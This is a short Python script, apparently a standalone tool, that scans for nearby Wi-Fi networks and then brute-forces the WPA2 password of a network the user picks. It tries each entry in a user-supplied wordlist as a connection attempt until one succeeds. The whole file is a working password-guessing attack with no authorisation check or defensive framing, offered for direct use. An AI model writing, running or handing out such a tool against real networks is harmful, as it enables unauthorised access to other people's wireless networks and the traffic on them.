import time, pywifi
from pyfiglet import Figlet
from pywifi import const
from pywifi import Profile
from pywifi import PyWiFi

def cracking(ssid, word):
        wordlist = open(word, "r")

        for passw in wordlist:
            profile = pywifi.Profile()
            profile.ssid = ssid
            profile.auth = const.AUTH_ALG_OPEN
            profile.akm.append(const.AKM_TYPE_WPA2PSK)
            profile.cipher = const.CIPHER_TYPE_CCMP
            passw=passw.strip()
            profile.key = passw
            wifi = pywifi.PyWiFi()
            iface = wifi.interfaces()[0]
            iface.remove_all_network_profiles()
            profile = iface.add_network_profile(profile)

            iface.connect(profile)
            time.sleep(4)
            if iface.status() == const.IFACE_CONNECTED:
                print('PASSWORD FOUND! SSID:' ,ssid,'PASSWORD:',passw)
                break
        else:
                print("Password Not In List")
                
print("Scanning for wifi devices")
print("Please Wait")
f = Figlet(font='isometric2')
print(f.renderText('WiFi Brute'))
wifi = pywifi.PyWiFi() 

interface = wifi.interfaces()[0]

interface.scan()
time.sleep(5) 

x = interface.scan_results()

available_devices = []

for i in x:
  available_devices.append(i.ssid)

print("Available devices:")

for j in available_devices:
   print(j)

ssid = input("SSID:")
word = input("Wordlist:")

print("Cracking")
m = cracking(ssid, word)

